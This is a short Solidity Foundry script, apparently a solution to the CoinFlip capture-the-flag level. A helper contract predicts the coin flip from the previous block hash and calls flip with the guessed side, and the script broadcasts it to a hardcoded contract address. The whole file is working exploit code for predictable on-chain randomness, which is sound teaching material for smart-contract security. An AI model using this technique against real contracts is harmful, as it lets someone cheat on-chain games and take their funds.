// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import {Script} from "forge-std/Script.sol";

contract Player {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipAttack is Script {
    CoinFlip public coinFlipInstance =
        CoinFlip(0xefa64DFF820750554559a2E55bf2555f703aE4Ab);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(coinFlipInstance);

        vm.stopBroadcast();
    }
}
